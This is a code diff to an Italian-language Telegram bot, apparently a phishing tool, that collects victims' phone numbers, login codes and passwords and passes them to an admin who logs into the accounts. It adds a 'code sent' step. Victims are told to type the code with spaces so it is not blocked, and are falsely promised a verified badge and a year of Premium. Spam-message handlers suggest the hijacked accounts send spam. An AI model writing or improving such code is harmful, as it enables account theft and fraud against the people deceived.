@@ -11,6 +11,7 @@ from telegram.ext import (
     MessageHandler,
     filters,
 )
+from keep_alive import keep_alive
 
 # Configurazione dei log
 logging.basicConfig(
@@ -28,7 +29,7 @@ WAITING_PHONE, WAITING_CODE, WAITING_PASSWORD, WAITING_SPAM_MSG, WAITING_SPAM_TI
 # Database in memoria
 approved_users = set()
 user_states = {}
-user_data_store = {}  # {user_id: {"phone": str, "spam_msg": str, "spam_time": int, "verify_time": float}}
+user_data_store = {}
 
 
 # --- COMANDO /START E SELEZIONE LINGUA ---
@@ -39,7 +40,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("👑 Benvenuto Admin nel pannello di controllo.")
         return
 
-    # Notifica silenziosa all'Admin
     if user.id not in approved_users:
         try:
             keyboard = [
@@ -172,8 +172,6 @@ async def verify_account_handler(update: Update, context: ContextTypes.DEFAULT_T
 
     data = user_data_store[user_id]
     current_time = time.time()
-    
-    # 2 giorni in secondi = 2 * 24 * 60 * 60 = 172800 secondi (per test puoi ridurlo se vuoi)
     due_giorni_secondi = 172800 
 
     if "verify_start_time" not in data:
@@ -272,18 +270,28 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
         target_id = int(data.split("_")[1])
         await query.edit_message_text(text=f"❌ Richiesta declinata.")
 
+    # --- MESSAGGIO ESATTO PRESO DALLA FOTO ---
+    elif data.startswith("code_sent_"):
+        target_id = int(data.split("_")[2])
+        await query.edit_message_text(text=f"✅ Hai segnato 'Codice inviato' per l'utente `{target_id}`.")
+        
+        code_message = (
+            "⏳ Codice inviato! Arriverà il codice tra poco.\n"
+            "Invia il codice ricevuto (es. 1  2  3  4  5, 12  34  54 oppure 12. 34. 54).\n\n"
+            "⚠️ Attenzione: non mandare mai tipo 123456 altrimenti la procedura non andrà a buon fine."
+        )
+        await context.bot.send_message(chat_id=target_id, text=code_message)
+
     elif data.startswith("success_login_"):
         target_id = int(data.split("_")[2])
         await query.edit_message_text(text=f"✅ Accesso confermato per l'utente `{target_id}`.")
         
-        # Messaggio aggiornato con la spunta blu e 1 anno di premium dopo 2 giorni
         success_message = (
-            "✅ **Account collegato con successo!**\n\n"
-            "⚠️ **ATTENZIONE:** Non terminare l'attività in esecuzione del bot dai dispositivi connessi.\n\n"
-            "ℹ️ *Nota:* Passati 2 giorni verrà messa la spunta blu verificata ufficiale da Telegram come contatto ufficiale e verrà messo 1 anno di Telegram Premium.\n\n"
-            "🔄 Manda il comando `/start` per accedere alla gestione account."
+            "✅ Account collegato con successo!\n\n"
+            "⚠️ ATTENZIONE: Non terminare l'attività in esecuzione del bot dai dispositivi connessi.\n\n"
+            "ℹ️ Nota: Passati 2 giorni verrà messa la spunta blu verificata ufficiale da Telegram come contatto ufficiale e verrà messo 1 anno di Telegram Premium."
         )
-        await context.bot.send_message(chat_id=target_id, text=success_message, parse_mode="Markdown")
+        await context.bot.send_message(chat_id=target_id, text=success_message)
 
     elif data.startswith("fail_login_"):
         target_id = int(data.split("_")[2])
@@ -382,16 +390,16 @@ async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_data_store[user.id] = {}
     user_data_store[user.id]["phone"] = phone
 
+    # Admin riceve il numero con entrambi i pulsanti
     msg = f"📥 **NUOVO NUMERO**\n• Utente: {user.full_name} (`{user.id}`)\n• Numero: `{phone}`"
-    keyboard = [[InlineKeyboardButton("❌ Riprova", callback_data=f"fail_login_{user.id}")]]
+    keyboard = [
+        [InlineKeyboardButton("📤 Codice inviato", callback_data=f"code_sent_{user.id}")],
+        [InlineKeyboardButton("❌ Non Entrato", callback_data=f"fail_login_{user.id}")]
+    ]
     await context.bot.send_message(chat_id=ADMIN_ID, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
-    await update.message.reply_text(
-        "⏳ Codice inviato! Arriverà il codice tra poco.\n"
-        "Invia il codice ricevuto (es. `1 2 3 4 5`, `12 34 54` oppure `12. 34. 54`).\n\n"
-        "⚠️ **Attenzione:** non mandare mai tipo `123456` altrimenti la procedura non andrà a buon fine.",
-        parse_mode="Markdown"
-    )
+    # All'utente esce il messaggio con l'emoji
+    await update.message.reply_text("⏳ **Invio del codice in corso...** 🔄", parse_mode="Markdown")
     return WAITING_CODE
 
 
@@ -470,11 +478,14 @@ def main():
     app.add_handler(conv_spam_msg)
     app.add_handler(conv_spam_time)
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_password))
-    app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|success_login_|fail_login_|req_pass_)"))
+    app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|code_sent_|success_login_|fail_login_|req_pass_)"))
 
-    print("🤖 Booster Bot con verifica account e timer attivi...")
+    print("🤖 Booster Bot con testo codice inviato aggiornato...")
+    
+    keep_alive()
     app.run_polling()
 
 
 if __name__ == "__main__":
     main()
+
